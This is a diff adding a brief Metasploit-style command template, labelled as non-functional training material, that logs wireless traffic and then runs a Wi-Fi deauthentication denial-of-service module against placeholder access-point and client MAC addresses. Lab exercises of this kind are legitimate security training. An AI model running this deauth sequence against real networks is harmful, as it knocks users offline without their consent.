@@ -1,0 +1,13 @@
+# WiFi Scanner Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/wireless/kismet_logging
+set INTERFACE wlan0mon
+set LOGDIR /tmp/kismet_logs
+run
+
+use auxiliary/dos/wifi/deauth
+set INTERFACE wlan0mon
+set BSSID 00:11:22:33:44:55
+set CLIENT 66:77:88:99:AA:BB
+run
